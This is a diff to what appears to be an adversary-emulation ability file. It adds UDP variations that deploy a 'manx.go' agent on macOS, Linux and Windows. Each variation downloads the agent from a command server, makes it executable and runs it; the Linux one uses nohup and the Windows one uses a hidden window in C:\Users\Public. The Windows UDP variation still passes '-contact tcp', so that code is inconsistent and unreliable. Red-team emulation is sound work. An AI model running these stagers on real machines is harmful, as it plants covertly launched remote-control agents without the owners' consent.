@@ -18,6 +18,14 @@
           chmod +x manx.go;
           ./manx.go -http $server -socket $socket -contact $contact -v
         variations:
+          - description: Run against the UDP contact
+            command: |
+              server="#{app.contact.http}";
+              socket="#{app.contact.udp}";
+              contact="udp";
+              curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > manx.go;
+              chmod +x manx.go;
+              ./manx.go -http $server -socket $socket -contact $contact -v
           - description: Download with a random name and start as a background process
             command: |
               server="#{app.contact.http}";
@@ -35,6 +43,13 @@
           chmod +x manx.go;
           ./manx.go -http $server -socket $socket -contact $contact -v
         variations:
+          - description: Run against the UDP contact
+            command: |
+              server="#{app.contact.http}";
+              socket="#{app.contact.udp}";
+              contact="udp";
+              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -http $server -socket $socket -contact $contact &
           - description: Download with a random name and start as a background process
             command: |
               server="#{app.contact.http}";
@@ -59,3 +74,20 @@
           rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;
           ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null;
           Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact tcp" -WindowStyle hidden;
+        variations:
+          - description: Run against the UDP contact
+            command: |
+              if ($host.Version.Major -ge 3){$ErrAction= "ignore"}else{$ErrAction= "SilentlyContinue"};
+              $server="#{app.contact.http}";
+              $socket="#{app.contact.udp}";
+              $contact="udp";
+              $url="$server/file/download";
+              $wc=New-Object System.Net.WebClient;
+              $wc.Headers.add("platform","windows");
+              $wc.Headers.add("file","manx.go");
+              $data=$wc.DownloadData($url);
+              $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
+              Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea $ErrAction;
+              rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;
+              ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact tcp" -WindowStyle hidden;
